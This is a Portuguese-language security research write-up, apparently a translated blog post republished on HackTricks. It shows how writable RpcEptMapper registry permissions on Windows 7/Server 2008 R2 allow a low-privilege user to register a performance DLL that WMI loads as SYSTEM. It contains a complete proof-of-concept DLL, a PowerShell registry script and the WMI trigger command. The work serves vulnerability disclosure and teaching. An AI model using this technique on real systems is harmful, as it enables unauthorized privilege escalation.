De acordo com a saída do script, o usuário atual tem algumas permissões de escrita em duas chaves do registro:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

Vamos verificar manualmente as permissões do serviço `RpcEptMapper` usando a interface gráfica do `regedit`. Uma coisa que eu realmente gosto na janela _Advanced Security Settings_ é a guia _Effective Permissions_. Você pode escolher qualquer nome de usuário ou grupo e imediatamente ver as permissões efetivas concedidas a esse principal sem a necessidade de inspecionar todas as ACEs separadamente. A seguinte captura de tela mostra o resultado para a conta de baixo privilégio `lab-user`.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

A maioria das permissões são padrão (por exemplo: `Query Value`), mas uma em particular se destaca: `Create Subkey`. O nome genérico correspondente a essa permissão é `AppendData/AddSubdirectory`, que é exatamente o que foi relatado pelo script:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
Isso significa que não podemos simplesmente modificar o valor `ImagePath`, por exemplo. Para fazer isso, precisaríamos da permissão `WriteData/AddFile`. Em vez disso, só podemos criar uma nova subchave.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

Isso significa que foi realmente um falso positivo? Certamente não. Que a diversão comece!

## RTFM <a href="#rtfm" id="rtfm"></a>

Neste ponto, sabemos que podemos criar subchaves arbitrárias em `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`, mas não podemos modificar subchaves e valores existentes. Essas subchaves já existentes são `Parameters` e `Security`, que são bastante comuns para serviços do Windows.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

Portanto, a primeira pergunta que veio à mente foi: _existe alguma outra subchave predefinida - como `Parameters` e `Security` - que poderíamos aproveitar para modificar efetivamente a configuração do serviço e alterar seu comportamento de alguma forma?_

Para responder a essa pergunta, meu plano inicial era enumerar todas as chaves existentes e tentar identificar um padrão. A ideia era ver quais subchaves são _significativas_ para a configuração de um serviço. Comecei a pensar em como poderia implementar isso em PowerShell e, em seguida, classificar o resultado. No entanto, antes de fazer isso, perguntei-me se essa estrutura de registro já estava documentada. Então, pesquisei algo como `windows service configuration registry site:microsoft.com` e aqui está o primeiro [resultado](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) que apareceu.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

Parece promissor, não é? À primeira vista, a documentação não parecia ser exaustiva e completa. Considerando o título, eu esperava ver algum tipo de estrutura de árvore detalhando todas as subchaves e valores que definem a configuração de um serviço, mas claramente não estava lá.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

Ainda assim, dei uma olhada rápida em cada parágrafo. E rapidamente identifiquei as palavras-chave "_**Performance**_" e "_**DLL**_". Sob o subtítulo "**Perfomance**", podemos ler o seguinte:

> **Performance**: _Uma chave que especifica informações para monitoramento de desempenho opcional. Os valores sob esta chave especificam **o nome da DLL de desempenho do driver** e **os nomes de certas funções exportadas nessa DLL**. Você pode adicionar entradas de valor a esta subchave usando entradas AddReg no arquivo INF do driver._

De acordo com este breve parágrafo, teoricamente, pode-se registrar uma DLL em um serviço de driver para monitorar seu desempenho graças à subchave `Performance`. **OK, isso é realmente interessante!** Essa chave não existe por padrão para o serviço `RpcEptMapper`, então parece ser _exatamente_ o que precisamos. Há um pequeno problema, no entanto, este serviço definitivamente não é um serviço de driver. De qualquer forma, ainda vale a pena tentar, mas precisamos de mais informações sobre esse recurso de "Monitoramento de Desempenho" primeiro.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **Observação:** no Windows, cada serviço tem um determinado `Tipo`. Um tipo de serviço pode ser um dos seguintes valores: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` ou `SERVICE_INTERACTIVE_PROCESS (256)`.

Depois de pesquisar um pouco, encontrei este recurso na documentação: [Criando a chave de desempenho do aplicativo](https://docs.microsoft.com/pt-br/windows/win32/perfctrs/creating-the-applications-performance-key).

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08_performance-subkey-documentation.png)

Primeiro, há uma estrutura de árvore agradável que lista todas as chaves e valores que precisamos criar. Em seguida, a descrição fornece as seguintes informações-chave:

* O valor `Library` pode conter **um nome de DLL ou um caminho completo para uma DLL**.
* Os valores `Open`, `Collect` e `Close` permitem que você especifique **os nomes das funções** que devem ser exportadas pela DLL.
* O tipo de dados desses valores é `REG_SZ` (ou mesmo `REG_EXPAND_SZ` para o valor `Library`).

Se você seguir os links incluídos neste recurso, encontrará o protótipo dessas funções junto com alguns exemplos de código: [Implementando OpenPerformanceData](https://docs.microsoft.com/pt-br/windows/win32/perfctrs/implementing-openperformancedata).
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
Acho que já é o suficiente com a teoria, é hora de começar a escrever algum código!

## Escrevendo uma prova de conceito <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

Graças a todos os pedaços de informação que consegui coletar ao longo da documentação, escrever uma DLL simples de prova de conceito deve ser bem simples. Mas ainda assim, precisamos de um plano!

Quando preciso explorar algum tipo de vulnerabilidade de sequestro de DLL, geralmente começo com uma função de ajuda de log simples e personalizada. O objetivo desta função é escrever algumas informações-chave em um arquivo sempre que for invocada. Normalmente, registro o PID do processo atual e do processo pai, o nome do usuário que executa o processo e a linha de comando correspondente. Também registro o nome da função que desencadeou este evento de log. Dessa forma, eu sei qual parte do código foi executada.

Em meus outros artigos, sempre pulei a parte de desenvolvimento porque assumi que era mais ou menos óbvio. Mas, também quero que meus posts sejam amigáveis para iniciantes, então há uma contradição. Vou remediar essa situação aqui detalhando o processo. Então, vamos abrir o Visual Studio e criar um novo projeto "Aplicativo de console C++". Observe que eu poderia ter criado um projeto "Biblioteca de vínculo dinâmico (DLL)", mas acho que é mais fácil começar com um aplicativo de console.

Aqui está o código inicial gerado pelo Visual Studio:
```c
#include <iostream>

int main()
{
    std::cout << "Hello World!\n";
}
```
Claro, isso não é o que queremos. Queremos criar uma DLL, não um EXE, então temos que substituir a função `main` por `DllMain`. Você pode encontrar um código esqueleto para esta função na documentação: [Inicializar uma DLL](https://docs.microsoft.com/pt-br/cpp/build/run-time-library-behavior#initialize-a-dll).
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        Log(L"DllMain"); // See log helper function below
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
Em paralelo, também precisamos alterar as configurações do projeto para especificar que o arquivo compilado de saída deve ser um DLL em vez de um EXE. Para fazer isso, você pode abrir as propriedades do projeto e, na seção "**Geral**", selecionar "**Biblioteca dinâmica (.dll)**" como o "**Tipo de configuração**". Logo abaixo da barra de título, você também pode selecionar "**Todas as configurações**" e "**Todas as plataformas**" para que essa configuração possa ser aplicada globalmente.

Em seguida, adiciono minha função auxiliar de log personalizada.
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
    LPWSTR pwszBuffer, pwszCommandLine;
    WCHAR wszUsername[UNLEN + 1] = { 0 };
    SYSTEMTIME st = { 0 };
    HANDLE hToolhelpSnapshot;
    PROCESSENTRY32 stProcessEntry = { 0 };
    DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
    BOOL bResult = FALSE;

    // Get the command line of the current process
    pwszCommandLine = GetCommandLine();

    // Get the name of the process owner
    GetUserName(wszUsername, &dwPcbBuffer);

    // Get the PID of the current process
    dwProcessId = GetCurrentProcessId();

    // Get the PID of the parent process
    hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
        do {
            if (stProcessEntry.th32ProcessID == dwProcessId) {
                dwParentProcessId = stProcessEntry.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
    }
    CloseHandle(hToolhelpSnapshot);

    // Get the current date and time
    GetLocalTime(&st);

    // Prepare the output string and log the result
    dwBufSize = 4096 * sizeof(WCHAR);
    pwszBuffer = (LPWSTR)malloc(dwBufSize);
    if (pwszBuffer)
    {
        StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
            st.wHour,
            st.wMinute,
            st.wSecond,
            dwProcessId,
            dwParentProcessId,
            wszUsername,
            pwszCommandLine,
            pwszCallingFrom
        );

        LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

        free(pwszBuffer);
    }
}
```
Então, podemos preencher a DLL com as três funções que vimos na documentação. A documentação também afirma que elas devem retornar `ERROR_SUCCESS` se forem bem-sucedidas.
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
    Log(L"OpenPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
    Log(L"CollectPerfData");
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
    Log(L"ClosePerfData");
    return ERROR_SUCCESS;
}
```
Ok, então o projeto está agora configurado corretamente, `DllMain` está implementado, temos uma função auxiliar de log e as três funções necessárias. No entanto, falta uma última coisa. Se compilarmos este código, `OpenPerfData`, `CollectPerfData` e `ClosePerfData` estarão disponíveis apenas como funções internas, então precisamos **exportá-las**. Isso pode ser alcançado de várias maneiras. Por exemplo, você poderia criar um arquivo [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) e, em seguida, configurar o projeto adequadamente. No entanto, prefiro usar a palavra-chave `__declspec(dllexport)` ([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)), especialmente para um projeto pequeno como este. Dessa forma, só precisamos declarar as três funções no início do código-fonte.
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
Se você quiser ver o código completo, eu o carreguei [aqui](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12).

Finalmente, podemos selecionar _**Release/x64**_ e “_**Build the solution**_”. Isso produzirá nosso arquivo DLL: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## Testando o PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

Antes de prosseguir, sempre me certifico de que minha carga útil está funcionando corretamente testando-a separadamente. O pouco tempo gasto aqui pode economizar muito tempo depois, evitando que você entre em um beco sem saída durante uma fase hipotética de depuração. Para fazer isso, podemos simplesmente usar `rundll32.exe` e passar o nome do DLL e o nome de uma função exportada como parâmetros.
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
Ótimo, o arquivo de log foi criado e, se o abrirmos, podemos ver duas entradas. A primeira foi escrita quando a DLL foi carregada pelo `rundll32.exe`. A segunda foi escrita quando `OpenPerfData` foi chamado. Parece bom! 😊
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
Ok, agora podemos nos concentrar na vulnerabilidade real e começar criando a chave e os valores do registro necessários. Podemos fazer isso manualmente usando `reg.exe` / `regedit.exe` ou programaticamente com um script. Como eu já passei pelas etapas manuais durante minha pesquisa inicial, mostrarei uma maneira mais limpa de fazer a mesma coisa com um script do PowerShell. Além disso, criar chaves e valores de registro no PowerShell é tão fácil quanto chamar `New-Item` e `New-ItemProperty`, não é mesmo? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`Acesso ao registro solicitado não é permitido`... Hmmm, ok... Parece que não será tão fácil assim. ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

Eu não investiguei muito esse problema, mas minha suposição é que, quando chamamos `New-Item`, o `powershell.exe` tenta abrir a chave do registro pai com algumas flags que correspondem a permissões que não temos.

De qualquer forma, se os cmdlets integrados não fizerem o trabalho, sempre podemos descer um nível e invocar as funções DotNet diretamente. De fato, as chaves do registro também podem ser criadas com o seguinte código no PowerShell.
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
Aqui vamos nós! No final, eu montei o seguinte script para criar a chave e valores apropriados, esperar por alguma entrada do usuário e finalmente encerrar limpando tudo.
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
O último passo agora, **como enganamos o serviço RPC Endpoint Mapper para carregar nossa DLL de desempenho?** Infelizmente, não acompanhei todas as diferentes coisas que tentei. Teria sido realmente interessante no contexto deste post destacar como a pesquisa pode ser tediosa e demorada às vezes. De qualquer forma, uma coisa que encontrei ao longo do caminho é que você pode consultar _Contadores de Desempenho_ usando o WMI (_Windows Management Instrumentation_), o que não é muito surpreendente afinal. Mais informações aqui: [_Tipos de Contadores de Desempenho do WMI_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Os tipos de contadores aparecem como o qualificador CounterType para propriedades nas classes_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _, e como o qualificador CookingType para propriedades nas classes_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _._

Então, eu primeiro enumerei as classes WMI relacionadas aos _Dados de Desempenho_ no PowerShell usando o seguinte comando.
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)

E, eu vi que meu arquivo de log foi criado quase imediatamente! Aqui está o conteúdo do arquivo.
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
Eu esperava obter a execução de código arbitrário como `NETWORK SERVICE` no contexto do serviço `RpcEptMapper`, no máximo, mas parece que obtive um resultado muito melhor do que o esperado. Na verdade, obtive a execução de código arbitrário no contexto do próprio serviço `WMI`, que é executado como `LOCAL SYSTEM`. Como isso é incrível?! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **Observação:** se eu tivesse obtido a execução de código arbitrário como `NETWORK SERVICE`, estaria a apenas um token da conta `LOCAL SYSTEM`, graças ao truque que foi demonstrado por James Forshaw alguns meses atrás neste post do blog: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

Também tentei obter cada classe WMI separadamente e observei exatamente o mesmo resultado.
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## Conclusão <a href="#conclusão" id="conclusão"></a>

Não sei como essa vulnerabilidade passou despercebida por tanto tempo. Uma explicação é que outras ferramentas provavelmente procuravam acesso total de gravação no registro, enquanto `AppendData/AddSubdirectory` era suficiente nesse caso. Em relação à "configuração incorreta" em si, eu presumiria que a chave do registro foi definida dessa maneira para um propósito específico, embora eu não possa pensar em um cenário concreto em que os usuários teriam algum tipo de permissão para modificar a configuração de um serviço.

Decidi escrever sobre essa vulnerabilidade publicamente por duas razões. A primeira é que eu a tornei pública - sem perceber inicialmente - no dia em que atualizei meu script PrivescCheck com a função `GetModfiableRegistryPath`, que foi há vários meses. A segunda é que o impacto é baixo. Requer acesso local e afeta apenas versões antigas do Windows que não são mais suportadas (a menos que você tenha adquirido o Suporte Estendido...). Neste ponto, se você ainda estiver usando o Windows 7 / Server 2008 R2 sem isolar adequadamente essas máquinas na rede primeiro, impedir que um invasor obtenha privilégios do SYSTEM provavelmente é a menor de suas preocupações.

Além do lado anedótico dessa vulnerabilidade de escalonamento de privilégios, acredito que essa configuração de registro de "Desempenho" abre oportunidades realmente interessantes para pós-exploração, movimento lateral e evasão de AV/EDR. Já tenho alguns cenários específicos em mente, mas ainda não testei nenhum deles. Continua?...

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
